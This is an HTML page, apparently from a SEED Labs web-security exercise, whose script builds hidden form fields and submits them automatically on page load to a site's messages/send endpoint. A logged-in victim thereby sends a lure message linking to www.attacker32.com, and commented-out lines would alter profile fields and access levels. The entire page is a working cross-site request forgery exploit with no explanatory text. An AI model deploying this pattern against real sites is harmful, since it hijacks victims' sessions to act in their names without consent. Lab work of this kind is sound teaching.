<html>
<body>
<h1>This page forges an HTTP POST request.</h1>
<script type="text/javascript">

function forge_post()
{
    var fields;

    // The following are form entries need to be filled out by attackers.
    // The entries are made hidden, so the victim won't be able to see them.
    fields += "<input type='hidden' name='name' value='Alice'>";
    //fields += "<input type='hidden' name='briefdescription' value='Samy is my hero'>";
    //fields += "<input type='hidden' name='interests' value='Hacking'>";
    fields += "<input type='hidden' name='recipients' value='Boby'>";
    //fields += "<input type='hidden' name='description' value='Samy is my hero'>";
    //fields += "<input type='hidden' name='accesslevel[briefdescription]' value='2'>"; 
    //fields += "<input type='hidden' name='accesslevel[description]' value='2'>"; 
    //fields += "<input type='hidden' name='accesslevel[interests]' value='2'>"; 
    //fields += "<input type='hidden' name='accesslevel[twitter]' value='2'>";
    
    fields += "<input type='hidden' name='recipients[]' value='57'>";
    fields += "<input type='hidden' name='subject' value='check out my recent photos'>";
    fields += "<input type='hidden' name='body' value='<p>link is here:www.attacker32.com</p>'>";
    fields += "<input type='hidden' name='guid' value='56'>";

    // Create a <form> element.
    var p = document.createElement("form");

    // Construct the form
    p.action = "http://www.seed-server.com/action/messages/send";
    p.innerHTML = fields;
    p.method = "post";

    // Append the form to the current page.
    document.body.appendChild(p);

    // Submit the form
    p.submit();
}


// Invoke forge_post() after the page is loaded.
window.onload = function() { forge_post();}
</script>
</body>
</html>
